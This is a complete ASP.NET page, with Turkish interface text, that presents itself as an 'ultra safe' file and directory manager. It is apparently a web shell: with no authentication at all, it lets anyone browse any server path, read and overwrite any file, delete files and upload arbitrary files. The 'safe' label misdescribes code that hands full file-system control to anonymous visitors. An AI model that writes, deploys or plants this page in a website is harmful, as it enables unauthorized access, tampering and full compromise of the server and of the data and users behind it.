<%@ Page Language="C#" Debug="false" EnableViewState="false" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    // Ultra Safe Minimal ASP.NET File & Directory Manager
    string CWD = "";
    string Msg = "";
    string MsgType = "";

    void Page_Load(object sender, EventArgs e) {
        try {
            string reqDir = Request["d"];
            if (string.IsNullOrEmpty(reqDir)) {
                CWD = Server.MapPath("./");
            } else {
                CWD = reqDir;
            }

            string act = Request["act"];
            string fp = Request["fp"];

            // Dosya Silme
            if (act == "del" && !string.IsNullOrEmpty(fp) && File.Exists(fp)) {
                try {
                    File.Delete(fp);
                    Msg = "Dosya silindi: " + Path.GetFileName(fp);
                    MsgType = "ok";
                } catch (Exception ex) {
                    Msg = "Silme hatası: " + ex.Message;
                    MsgType = "err";
                }
            }

            // Dosya Kaydetme
            if (act == "save" && !string.IsNullOrEmpty(fp)) {
                try {
                    File.WriteAllText(fp, Request.Form["cnt"] ?? "");
                    Msg = "Kaydedildi: " + Path.GetFileName(fp);
                    MsgType = "ok";
                } catch (Exception ex) {
                    Msg = "Kaydetme hatası: " + ex.Message;
                    MsgType = "err";
                }
            }

            // Dosya Yükleme
            if (Request.Files.Count > 0 && Request.Files[0].ContentLength > 0) {
                try {
                    var f = Request.Files[0];
                    string fn = Path.GetFileName(f.FileName);
                    string target = Path.Combine(CWD, fn);
                    f.SaveAs(target);
                    Msg = "Dosya yüklendi: " + fn;
                    MsgType = "ok";
                } catch (Exception ex) {
                    Msg = "Yükleme hatası: " + ex.Message;
                    MsgType = "err";
                }
            }
        } catch (Exception ex) {
            Msg = "Genel Hata: " + ex.Message;
            MsgType = "err";
        }
    }

    string FormatSize(long b) {
        if (b < 1024) return b + " B";
        if (b < 1048576) return (b / 1024.0).ToString("F1") + " KB";
        return (b / 1048576.0).ToString("F1") + " MB";
    }
</script>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Yönetim</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #e0e0e0; margin: 0; padding: 20px; font-size: 13px; }
        a { color: #64b5f6; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .box { background: #1e1e1e; border: 1px solid #333; padding: 15px; border-radius: 6px; margin-bottom: 15px; }
        .msg-ok { background: #1b5e20; color: #a5d6a7; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        .msg-err { background: #b71c1c; color: #ef9a9a; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #2a2a2a; }
        th { background: #252525; }
        textarea { width: 100%; height: 300px; background: #000; color: #00ff00; font-family: monospace; border: 1px solid #444; padding: 8px; box-sizing: border-box; }
        input[type="text"] { background: #252525; color: #fff; border: 1px solid #444; padding: 6px; border-radius: 3px; }
        button { background: #2e7d32; color: #fff; border: 0; padding: 7px 15px; border-radius: 3px; cursor: pointer; font-weight: bold; }
        button:hover { background: #388e3c; }
    </style>
</head>
<body>

<% if (!string.IsNullOrEmpty(Msg)) { %>
    <div class="<%= MsgType == "ok" ? "msg-ok" : "msg-err" %>"><%= Server.HtmlEncode(Msg) %></div>
<% } %>

<% 
    string editFp = Request["edit"];
    if (!string.IsNullOrEmpty(editFp) && File.Exists(editFp)) {
        string fileContent = "";
        try { fileContent = File.ReadAllText(editFp); } catch (Exception ex) { fileContent = "Okuma hatası: " + ex.Message; }
%>
    <div class="box">
        <h3>Düzenle: <%= Server.HtmlEncode(Path.GetFileName(editFp)) %></h3>
        <form method="post" action="?d=<%= Server.UrlEncode(CWD) %>">
            <input type="hidden" name="act" value="save" />
            <input type="hidden" name="fp" value="<%= Server.HtmlEncode(editFp) %>" />
            <textarea name="cnt"><%= Server.HtmlEncode(fileContent) %></textarea><br><br>
            <button type="submit">Kaydet</button>
            <a href="?d=<%= Server.UrlEncode(CWD) %>" style="margin-left:15px;">İptal</a>
        </form>
    </div>
<% } else { %>

    <div class="box">
        <b>Aktif Dizin:</b> <%= Server.HtmlEncode(CWD) %>
    </div>

    <div class="box">
        <form method="post" enctype="multipart/form-data" action="?d=<%= Server.UrlEncode(CWD) %>">
            <b>Dosya Yükle:</b> <input type="file" name="file1" /> 
            <button type="submit">Yükle</button>
        </form>
    </div>

    <div class="box">
        <table>
            <tr><th>Ad</th><th>Boyut</th><th>Tarih</th><th>İşlem</th></tr>
            <%
                try {
                    if (CWD != Path.GetPathRoot(CWD)) {
                        string parentDir = Path.GetDirectoryName(CWD);
            %>
                        <tr><td colspan="4"><a href="?d=<%= Server.UrlEncode(parentDir) %>">📁 [ Üst Klasör ]</a></td></tr>
            <%
                    }

                    foreach (string dirPath in Directory.GetDirectories(CWD)) {
                        string dirName = Path.GetFileName(dirPath);
            %>
                        <tr>
                            <td><a href="?d=<%= Server.UrlEncode(dirPath) %>">📁 <%= Server.HtmlEncode(dirName) %></a></td>
                            <td>Klasör</td>
                            <td>-</td>
                            <td>-</td>
                        </tr>
            <%
                    }

                    foreach (string filePath in Directory.GetFiles(CWD)) {
                        string fileName = Path.GetFileName(filePath);
                        var fi = new FileInfo(filePath);
            %>
                        <tr>
                            <td>📄 <%= Server.HtmlEncode(fileName) %></td>
                            <td><%= FormatSize(fi.Length) %></td>
                            <td><%= fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
                            <td>
                                <a href="?d=<%= Server.UrlEncode(CWD) %>&edit=<%= Server.UrlEncode(filePath) %>">Düzenle</a> | 
                                <a href="?d=<%= Server.UrlEncode(CWD) %>&act=del&fp=<%= Server.UrlEncode(filePath) %>" onclick="return confirm('Silinsin mi?')" style="color:#ff5252">Sil</a>
                            </td>
                        </tr>
            <%
                    }
                } catch (Exception ex) {
                    Response.Write("<tr><td colspan='4' style='color:red;'>Dizin Okuma Hatası: " + Server.HtmlEncode(ex.Message) + "</td></tr>");
                }
            %>
        </table>
    </div>

<% } %>

</body>
</html>